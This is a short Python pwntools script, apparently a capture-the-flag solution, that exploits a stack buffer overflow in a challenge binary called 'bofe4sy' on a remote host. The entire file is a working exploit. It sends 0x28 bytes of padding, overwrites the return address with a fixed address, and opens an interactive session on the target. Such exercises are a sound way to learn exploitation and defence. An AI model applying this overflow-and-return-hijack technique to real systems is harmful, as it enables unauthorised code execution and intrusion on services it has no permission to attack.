#!/usr/bin/env python
from pwn import *

context(arch = "amd64", os = "linux", bits = 64)

DEBUG = False
if DEBUG:
    p = process("bofe4sy")
else:
    p = remote("pwnhub.tw", 11111)

padding = "A" * 0x28
ret_addr = 0x0000000000400646
payload = padding + p64(ret_addr)

p.recvline()
p.recv()
p.sendline(payload)

p.interactive()
p.close()
